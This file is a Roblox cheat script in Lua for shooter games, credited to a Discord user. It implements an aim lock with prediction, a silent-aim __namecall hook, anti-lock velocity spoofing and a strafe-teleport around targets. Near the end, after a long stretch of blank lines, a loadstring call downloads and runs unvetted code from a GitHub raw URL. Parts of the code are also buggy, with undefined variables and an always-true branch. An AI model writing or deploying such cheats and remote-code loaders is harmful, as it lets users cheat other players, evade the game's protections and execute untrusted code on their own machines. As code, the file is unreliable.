--[[
    ALL CREDITS GOES TO "id.c" ON DISCORD
    DO NOT SHARE THIS SOURCE CODE. 
]]
getgenv().sets = {
    safeplay = true,
    aimpart = "UpperTorso", -- UpperTorso, HumanoidRootPart, Humanoid, LowerTorso, Head .
    resolveType = "Hard", -- Y: resolves sky and ground antis, Hard: resolves any anti ig .
    resolver = {
        enabled = false,
        oldPos = Vector3.new(0,0,0),
        oldTick = tick(),
        updateRate = 120
    },
    aimlock = {
        enabled = false,
        target = nil
    },
    lock = false,
    smooth = true,
    dot = true,
    autopredict = false,
    autopredictamount = 0.001788,
    prediction = 0.2693,
    airoffset = 2.38,
    smoothing = 0.420,
    antilock = false,
    antilockpos = "Troll", -- Sky / Ground / Troll / Prediction
    antikey = Enum.KeyCode.T,
    aimlockkey = Enum.KeyCode.G,
    lockkey = Enum.KeyCode.C,
    strafekey = Enum.KeyCode.F,
    resolverkey = Enum.KeyCode.Z,
    safekey = Enum.KeyCode.Q,
    knockCheck = true,
    strafe = {
        status = false,
        height = 3,
        speed = 0.2,
        distance = 15
    },
    whitelist = {}
}
local supportedknocks = {
    15186202290, -- Da Strike
    17403265390, -- Da Downhill
    18111448661 -- Da Uphill
}

local me = game.Players.LocalPlayer
local cam = game.workspace.CurrentCamera
local rs = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local ping, val
local TARGET
local targetname
local mouse = me:GetMouse()
local WSplayers = nil

do
    for _, v in workspace:GetDescendants() do
        if v.Name == me.Name then
            WSplayers = v.Parent
        end
    end
end

-- dot stuff
local dot = Drawing.new('Circle')
dot.Visible = false
dot.Filled = true
dot.Radius = 3
dot.Color = Color3.fromRGB(255, 27, 27)

function Notif(title, yap, dur)
    game.StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = yap,
        Duration = dur
    })
end

-- Returns a string (Player's Name)
function getuser(inp)
    if inp == " " or inp == "" then return end
    local low = inp:lower()
    for _,v in next, game.Players:GetChildren() do
        if string.sub(v.Name:lower(),1,#low) == low or string.sub(v.DisplayName:lower(),1,#low) == low and v.Name ~= me.Name then
            return v.Name
        end
    end
end

-- Returns Instance (Player)
function getclosest()
    local closest
    local max = math.huge
    local dis = nil
    local mousePos = Vector2.new(mouse.X, mouse.Y)
    local alive = {}
    for _, player in game.Players:GetPlayers() do
        if not table.find(sets.whitelist, player.Name) and player ~= me and sets.knockCheck and isKnocked(player.Name) == false then
            table.insert(alive, player)
        end
    end
    for _, player in alive do
        local v3, ons = cam:WorldToViewportPoint(player.Character[sets.aimpart].Position)
        local v2 = Vector2.new(v3.X, v3.Y)

        if ons then
            -- Wall check
            local origin = cam.CFrame.Position
            local direction = (player.Character[sets.aimpart].Position - origin).unit * (player.Character[sets.aimpart].Position - origin).magnitude
            local ray = Ray.new(origin, direction)
            local hit, p = workspace:FindPartOnRay(ray, me.Character)

            if not hit or hit:IsDescendantOf(player.Character) then
                dis = (mousePos - v2).magnitude
                if dis < max then
                    closest = player
                    max = dis
                end
            end
        end
    end
    return closest
end

function isKnocked(name)
    local person = WSplayers[name]
    local knocked
    if table.find(supportedknocks, game.PlaceId) then
        knocked = person:GetAttribute("Knocked")
    else
        return false
    end
    return knocked
end

function strafe(name)
    local target = game.Players[name]
    local hum = me.Character.HumanoidRootPart
    local angle = math.pi / sets.strafe.speed

    coroutine.wrap(function()
        while task.wait() do
            if sets.strafe.status == false then
                break end

            local ang = tick() * angle
            local center = target.Character.HumanoidRootPart.Position
            local x,y,z
            x = center.X + sets.strafe.distance * math.cos(ang)
            y = center.Y + sets.strafe.height
            z = center.Z + sets.strafe.distance * math.sin(ang)

            hum.CFrame = CFrame.new(Vector3.new(x,y,z))
            hum.CFrame = CFrame.new(hum.Position, center)
        end
    end)()
end

function resolve(name)
    if sets.resolveType == "Y" then
        local plr = game.Players[name]
        local vel = plr.Character[sets.aimpart].AssemblyLinearVelocity

        vel = Vector3.new(vel.X, 0, vel.Z)

        return vel
    elseif sets.resolveType == "Hard" then
        local plr = game.Players[name]
        local aimpart = plr.Character["HumanoidRootPart"]
        sets.resolver.oldPos = aimpart.Position
        sets.resolver.oldTick = tick()
        task.wait()
        local newPos = aimpart.Position
        local newTick = tick()
        local calcTime = newTick - sets.resolver.oldTick
        local vel = (newPos - sets.resolver.oldPos) / calcTime
        if tick() - sets.resolver.oldTick >= 1/sets.resolver.updateRate then
            sets.resolver.oldPos = newPos
            sets.resolver.oldTick = newTick
        end
        return vel
    end
end

function lock(name)
    task.spawn(function()
        while task.wait() do
            if not sets.lock then break end

            local target = game.Players[name]
            TARGET = target
            local aimpart = target.Character[sets.aimpart]
            local pos = aimpart.Position
            local vel = aimpart.AssemblyLinearVelocity
            local calc, goal
            local mag = target.Character.Humanoid.MoveDirection.magnitude
            local isSmoothing = nil

            if sets.resolver.enabled then
                vel = resolve(name)
            end

            if sets.knockCheck and isKnocked(name) then
                break
            end

            if target then
                if not sets.autopredict then
                    -- normal prediction
                    calc = Vector3.new(pos.X + (vel.X * sets.prediction), pos.Y + ((vel.Y * sets.prediction)/sets.airoffset), pos.Z + (vel.Z * sets.prediction))
                    goal = CFrame.new(cam.CFrame.p, calc)

                    if not sets.smooth then
                        -- not smooth
                        isSmoothing = false
                        cam.CFrame = goal
                    else
                        -- smooth
                        isSmoothing = true
                        cam.CFrame = cam.CFrame:lerp(goal, sets.smoothing, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
                    end
                else
                    -- auto prediction
                    calc = Vector3.new(pos.X + (vel.X * (mag*(ping*sets.autopredictamount))), pos.Y + (vel.Y * ((mag*(ping*sets.autopredictamount))/sets.airoffset)), pos.Z + (vel.Z * (mag*(ping*sets.autopredictamount))))
                    goal = CFrame.new(cam.CFrame.p, calc)

                    if not sets.smooth then
                        -- not smooth
                        isSmoothing = false
                        cam.CFrame = goal
                    else
                        -- smooth
                        isSmoothing = true
                        cam.CFrame = cam.CFrame:lerp(goal, sets.smoothing, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
                    end
                end
            end
        end
    end)
end

-- BUTTON EVENTS
uis.InputBegan:Connect(function(k, gpe)
    if gpe then return end

    if k.KeyCode == sets.lockkey then
        sets.lock = not sets.lock
        targetname = getuser(getclosest().Name)
        if sets.lock then
            Notif("LOCK NOTIFICATION", "Currently locked on: ".. targetname, 2)
        end
        lock(targetname)
    elseif k.KeyCode == sets.strafekey and not sets.safeplay then
        sets.strafe.status = not sets.strafe.status
        if sets.strafe.status then sets.smoothing = 0.766 elseif not sets.strafe.status then sets.smoothing = .366 end
        if targetname ~= nil then strafe(targetname); Notif("STRAFE: ".. tostring(sets.strafe.status), "STRAFE STATUS: ".. tostring(sets.strafe.status), 2) end
    elseif k.KeyCode == sets.antikey and not sets.safeplay then
        sets.antilock = not sets.antilock
        Notif("ANTILOCK: ".. tostring(sets.antilock), "Anti lock status: ".. tostring(sets.antilock), 2)
    elseif k.KeyCode == sets.resolverkey then
        sets.resolver.enabled = not sets.resolver.enabled
        Notif("RESOLVER: ".. tostring(sets.resolver.enabled), "Resolver keybind pressed!", 3)
    elseif k.KeyCode == sets.aimlockkey then
        sets.aimlock.enabled = not sets.aimlock.enabled
        if sets.aimlock.enabled then
            sets.aimlock.target = getclosest()
            Notif("AIMLOCK: ".. tostring(sets.aimlock.enabled), "Locked on: "..sets.aimlock.target.Name, 3)
        end
        Notif("AIMLOCK: ".. tostring(sets.aimlock.enabled), "", 3)
    elseif k.KeyCode == sets.safekey then
        sets.safeplay = not sets.safeplay
        if sets.safeplay then
            sets.antilock = false
            sets.strafe.status = false
        end
        Notif("SAFEPLAY: ".. tostring(sets.safeplay), "ALL SETTINGS ARE OFF NOW!", 3)
    end
end)

-- Getting ping for auto prediction:
rs.Heartbeat:Connect(function()
    val = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    ping = tonumber(string.split(val, '(')[1])
end)

-- Managing the dot on closest player
rs.Heartbeat:Connect(function()
    if sets.lock then
        local pos, ons = cam:WorldToViewportPoint(TARGET.Character[sets.aimpart].Position)
        if pos and ons then
            dot.Position = Vector2.new(pos.X, pos.Y)
            dot.Visible = true
        else
            dot.Visible = false
        end
    else
        dot.Visible = false
    end
end)

-- Anti lock shit
rs.Heartbeat:Connect(function()
    if sets.antilock then
        local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
        local vel, cf = hrp.AssemblyLinearVelocity, hrp.CFrame

        if sets.antilockpos == "Sky" then
            hrp.AssemblyLinearVelocity = Vector3.new(0,6e6,0)
            hrp.CFrame = cf * CFrame.Angles(0,math.rad(0.1),0)
            rs.RenderStepped:Wait()
            hrp.AssemblyLinearVelocity = vel
        elseif sets.antilockpos == "Ground" then
            hrp.AssemblyLinearVelocity = Vector3.new(0,-6e6,0)
            hrp.CFrame = cf * CFrame.Angles(0,math.rad(0.1),0)
            rs.RenderStepped:Wait()
            hrp.AssemblyLinearVelocity = vel
        elseif sets.antilockpos == "Troll" then
            hrp.AssemblyLinearVelocity = Vector3.new(-66666, 666, 66666)
            rs.RenderStepped:Wait()
            hrp.AssemblyLinearVelocity = vel
        elseif sets.antilockpos == "Prediction" then
            hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
            rs.RenderStepped:Wait()
            hrp.AssemblyLinearVelocity = vel
        end
    end
end)

game:GetService("Players").PlayerRemoving:Connect(function(plr)
    local i = table.find(whitelist, plr.Name)
    if i then
        table.remove(whitelist, i)
    end
end)

me.Chatted:Connect(function(msg)
    if not msg then return end

    local words = string.split(msg, " ")
    local checker, cmd, third

    if #words == 3 then
        if words[1] == "/e" then
            checker = true
        else
            checker = false
        end
        cmd = words[2]
        third = getuser(words[3])
    end

    if cmd == "ws" and checker then
        table.insert(sets.whitelist, third)
        Notif("WHITELISTED", "Whitelisted player: ".. third, 3)
    elseif cmd == "unws" and checker then
        local i = table.find(sets.whitelist, third)
        table.remove(sets.whitelist, i)
        Notif("UNWHITELISTED", "Player is no more whitelisted: ".. third, 3)
    elseif "pred" and checker then
        if tonumber(third) > 1 then return end

        sets.prediction = tonumber(third)
        Notif("PREDICTION UPDATE", "Current prediction: ".. sets.prediction, 3)
    end
end)

game:GetService("Players").PlayerAdded:Connect(function(plr)
    if plr:GetAttribute("group") == me:GetAttribute("group") and plr:GetAttribute("group") ~= 0 then
        table.insert(sets.whitelist, player.Name)
    end
end)

for i, player in game.Players:GetPlayers() do
    if player:GetAttribute("group") == me:GetAttribute("group") and player:GetAttribute("group") ~= 0 then
        table.insert(sets.whitelist, player.Name)
    end
end

-- aimlock stuff hope it works
--[[
local aimlockhook
aimlockhook = hookmetamethod(game, "__namecall", function(self, ...)
    local arguments = {...}
    local method = tostring(getnamecallmethod())
    if self.Name:upper() == "MAINEVENT" and sets.aimlock.enabled and method == "FireServer" then
        local target = sets.aimlock.target
        local aimpart = target.Character[sets.aimpart]
        local pos = aimpart.Position
        local vel
        if target.Character then
            local calculation
            if sets.resolver.enabled then
                vel = resolve(target.Name)
            end
            
            if sets.autoprediction then
                calculation = Vector3.new(pos.X + (vel.X * (mag*(ping*sets.autopredictamount))), pos.Y + (vel.Y * ((mag*(ping*sets.autopredictamount))/sets.airoffset)), pos.Z + (vel.Z * (mag*(ping*sets.autopredictamount))))
            else
                calculation = Vector3.new(pos.X + (vel.X * sets.prediction), pos.Y + ((vel.Y * sets.prediction)/sets.airoffset), pos.Z + (vel.Z * sets.prediction))
            end
            
            arguments[2] = calculation
            
            return aimlockhook(self, unpack(arguments))
        end
    end
    return aimlockhook(self, unpack(arguments))
end)

me.Character.ChildAdded:Connect(function(tool)
    if tool:IsA("Tool") then
        local target = sets.aimlock.target
        local aimpart = target.Character[sets.aimpart]
        local pos = aimpart.Position
        local vel, calculation
        if target.Character then
            if sets.resolver.enabled then
                vel = resolve(target.Name)
            end
            
            if sets.autoprediction then
                calculation = Vector3.new(pos.X + (vel.X * (mag*(ping*sets.autopredictamount))), pos.Y + (vel.Y * ((mag*(ping*sets.autopredictamount))/sets.airoffset)), pos.Z + (vel.Z * (mag*(ping*sets.autopredictamount))))
            else
                calculation = Vector3.new(pos.X + (vel.X * sets.prediction), pos.Y + ((vel.Y * sets.prediction)/sets.airoffset), pos.Z + (vel.Z * sets.prediction))
            end
        end

        tool.Activated:Connect(function()
            for _,remote in game:GetService("RepicatedStorage"):GetDescendants() do
                if remote.Name:lower() == "mainevent" then
                    remote:FireServer(remote.Name, calculation)
                end
            end
        end)
    end
end)
]]














-- Chat spy
loadstring(game:HttpGet("https://raw.githubusercontent.com/3isht/3isht/master/chatspy"))()

Notif("Script is working!", "EVERYTHING WORKS CREDITS TO \"id.c\" ON DISCORD", 5)
